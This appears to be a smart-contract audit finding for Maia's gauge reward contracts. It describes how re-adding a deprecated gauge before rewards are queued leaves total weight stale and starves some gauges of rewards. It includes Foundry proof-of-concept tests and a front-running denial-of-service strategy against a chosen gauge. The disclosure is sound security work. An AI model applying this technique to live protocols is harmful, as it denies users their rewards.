[H-13] Re-adding a deprecated gauge in a new epoch before callingupdatePeriod()/queueRewardsForCycle()will leave some gauges without rewards
Submitted byVoyvoda
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L174-L181https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L407-L422https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/rewards/rewards/FlywheelGaugeRewards.sol#L72-L104
Impact
One or more gauges will remain without rewards. A malicious user can DOS a selected gauge from receiving rewards.
Proof of Concept
When a gauge is deprecated, its weight is subtracted fromtotalWeight; however, the weight of the gauge itself could remain different from 0 (it’s up to the users to remove their votes). That’s reflected in_addGauge().
function_addGauge(addressgauge)internalreturns(uint112weight) {// some code ...// Check if some previous weight exists and re-add to the total. Gauge and user weights are preserved.weight=_getGaugeWeight[gauge].currentWeight;if(weight>0) {_writeGaugeWeight(_totalWeight,_add112,weight,currentCycle);}emitAddGauge(gauge);}
WhenaddGauge(...)is invoked to re-add a gauge that was previously deprecated and still contains votes,_writeGaugeWeight(...)is called to add the gauge’s weight tototalWeight. When the write operation tototalWeightis performed during a new cycle, but beforeupdatePeriodorqueueRewardsForCycle()are called, we will have:
totalWeight.storedWeight = currentWeight(the weight before the update),totalWeight.currentWeight = newWeight(the new weight) andtotalWeight.currentCycle = cycle(the updated new cycle).
The problem is, that when nowqueueRewardsForCycle()is called and subsequently in the call chaincalculateGaugeAllocation(...)is called (which in turn will request thetotalWeightthrough_getStoredWeight(_totalWeight, currentCycle)), we will read the oldtotalWeight(i.e.totalWeight.storedWeight) becausetotalWeight.currentCycle < currentCycleis false, as the cycle was already updated during theaddGauge(...)call.
function_getStoredWeight(WeightstoragegaugeWeight,uint32currentCycle)internalviewreturns(uint112) {returngaugeWeight.currentCycle<currentCycle?gaugeWeight.currentWeight:gaugeWeight.storedWeight;}
This will now cause a wrong calculation of the rewards since we have 1 extra gauge, but the value oftotalWeightis less than what it is in reality. Therefore, the sum of the rewards among the gauges for the cycle will be more than the total sum allocated by the minter. In other words, the function in the code snippet below will be called for every gauge, including the re-added, buttotalis less than what it has to be.
functioncalculateGaugeAllocation(addressgauge,uint256quantity)externalviewreturns(uint256) {if(_deprecatedGauges.contains(gauge))return0;uint32currentCycle=_getGaugeCycleEnd();uint112total=_getStoredWeight(_totalWeight,currentCycle);uint112weight=_getStoredWeight(_getGaugeWeight[gauge],currentCycle);return(quantity*weight) /total;}
This can now cause several areas of concern.
First, in the presented scenario where a gauge is re-added with weight > 0 beforequeueRewardsForCycle(...), the last gauge (or perhaps the last few gauges, depending on the distribution of weight) among the active gauges that callsgetAccruedRewards()won’t receive awards since there will be less rewards than what’s recorded in the gauge state.
Second, in a scenario where we might have several gauges is with a “whale” gauge that holds a majority of votes and therefore, will have a large amount of rewards. A malicious actor can monitor for when a gauge is re-added and front rungetAccruedRewards()(potentially throughnewEpoch()inBaseV2Gauge) for all gauges, except the “whale” and achieving a DOS where the “whale” gauge won’t receive the rewards for the epoch. Therefore, the reputation of it will be damaged. This can be done for any gauge, but will have a more significant impact in the case where a lot of voters are denied their awards.
Coded PoC
Scenario 1
Initially, there are 2 gauges with 75%/25% split of the votes. The gauge with 25% of the votes is removed for 1 cycle and then re-added during a new cycle but before queuing of the rewards. The 25% gauge withdraws its rewards and the 75% gauge is bricked and can’t withdraw rewards.
Copy the functionstestInitialGauge&testDeprecatedAddedGaugeandhelper_gauge_statein/test/rewards/rewards/FlywheelGaugeRewardsTest.t.sol.
Addimport "lib/forge-std/src/console.sol";to the imports.
Execute withforge test --match-test testDeprecatedAddedGauge -vv.
Result: gauge 2 will revert after trying to collect rewards after the 3rd cycle, since gauge 1 was re-added before queuing rewards.
functiontestInitialGauge()public{uint256amount_rewards;// rewards is 100e18// add 2 gauges, 25%/75% splitgaugeToken.addGauge(gauge1);gaugeToken.addGauge(gauge2);gaugeToken.incrementGauge(gauge1,1e18);gaugeToken.incrementGauge(gauge2,3e18);console.log("--------------Initial gauge state--------------");helper_gauge_state();// do one normal cycle of rewardshevm.warp(block.timestamp+1000);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 1st queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);helper_gauge_state();// collect awardshevm.prank(gauge1);rewards.getAccruedRewards();hevm.prank(gauge2);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");helper_gauge_state();}functiontestDeprecatedAddedGauge()public{uint256amount_rewards;// setup + 1 normal cycletestInitialGauge();// remove gaugegaugeToken.removeGauge(gauge1);// do one more normal cycle with only 1 gaugehevm.warp(block.timestamp+1000);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 2nd queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);// examine statehelper_gauge_state();hevm.prank(gauge2);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");// examine statehelper_gauge_state();// A new epoch can start for 1 more cyclehevm.warp(block.timestamp+1000);// Add the gauge back, but before rewards are queuedgaugeToken.addGauge(gauge1);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 3rd queueRewardsForCycle state--------------");// examine stateconsole.log('nextCycleQueuedRewards',amount_rewards);helper_gauge_state();// this is finehevm.prank(gauge1);rewards.getAccruedRewards();// this revertshevm.prank(gauge2);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");// examine statehelper_gauge_state();}functionhelper_gauge_state()publicview{console.log('FlywheelRewards balance',rewardToken.balanceOf(address(rewards)));console.log('gaugeCycle',rewards.gaugeCycle());address[]memorygs=gaugeToken.gauges();for(uinti=0;i<gs.length;i++) {console.log('-------------');(uint112prior1,uint112stored1,uint32cycle1) =rewards.gaugeQueuedRewards(ERC20(gs[i]));console.log("Gauge ",i+1);console.log("priorRewards",prior1);console.log("cycleRewards",stored1);console.log("storedCycle",cycle1);}console.log('-------------');}
Scenario 2
Initially, there are 4 gauges with (2e18 | 2e18 | 6e18 | 4e18) votes respectively. The gauge with 4e18 votes is removed for 1 cycle and then re-added during a new cycle but before queuing of the rewards. The 6e18 gauge withdraws its rewards and the 4e18 gauge withdraws its rewards. The two gauges with 2e18 votes are bricked and can’t withdraw rewards.
Copy the functionstestInitialGauge2,testDeprecatedAddedGauge2andhelper_gauge_statein/test/rewards/rewards/FlywheelGaugeRewardsTest.t.sol.
Execute withforge test --match-test testDeprecatedAddedGauge2 -vv.
Result: the 2 gauges with 2e18 votes will revert after trying to collect rewards.
functiontestInitialGauge2()public{uint256amount_rewards;// rewards is 100e18// add 4 gauges, 2x/2x/6x/4x splitgaugeToken.addGauge(gauge1);gaugeToken.addGauge(gauge2);gaugeToken.addGauge(gauge3);gaugeToken.addGauge(gauge4);gaugeToken.incrementGauge(gauge1,2e18);gaugeToken.incrementGauge(gauge2,2e18);gaugeToken.incrementGauge(gauge3,6e18);gaugeToken.incrementGauge(gauge4,4e18);console.log("--------------Initial gauge state--------------");helper_gauge_state();// do one normal cycle of rewardshevm.warp(block.timestamp+1000);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 1st queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);helper_gauge_state();// collect awardshevm.prank(gauge1);rewards.getAccruedRewards();hevm.prank(gauge2);rewards.getAccruedRewards();hevm.prank(gauge3);rewards.getAccruedRewards();hevm.prank(gauge4);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");helper_gauge_state();}functiontestDeprecatedAddedGauge2()public{uint256amount_rewards;// setup + 1 normal cycletestInitialGauge2();// remove gaugegaugeToken.removeGauge(gauge4);// do one more normal cycle with only 3 gaugeshevm.warp(block.timestamp+1000);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 2nd queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);// examine statehelper_gauge_state();hevm.prank(gauge1);rewards.getAccruedRewards();hevm.prank(gauge2);rewards.getAccruedRewards();hevm.prank(gauge3);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");// examine statehelper_gauge_state();// A new epoch can start for 1 more cyclehevm.warp(block.timestamp+1000);// Add the gauge back, but before rewards are queuedgaugeToken.addGauge(gauge4);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 3rd queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);// examine statehelper_gauge_state();// this is finehevm.prank(gauge3);rewards.getAccruedRewards();// this is finehevm.prank(gauge4);rewards.getAccruedRewards();// this revertshevm.prank(gauge1);rewards.getAccruedRewards();// this reverts, same weight as gauge 1hevm.prank(gauge2);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");// examine statehelper_gauge_state();}functionhelper_gauge_state()publicview{console.log('FlywheelRewards balance',rewardToken.balanceOf(address(rewards)));console.log('gaugeCycle',rewards.gaugeCycle());address[]memorygs=gaugeToken.gauges();for(uinti=0;i<gs.length;i++) {console.log('-------------');(uint112prior1,uint112stored1,uint32cycle1) =rewards.gaugeQueuedRewards(ERC20(gs[i]));console.log("Gauge ",i+1);console.log("priorRewards",prior1);console.log("cycleRewards",stored1);console.log("storedCycle",cycle1);}console.log('-------------');}
Recommendation
When a new cycle starts, make sure gauges are re-added after rewards are queued in a cycle.
Assessed type
Timing
0xLightt (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.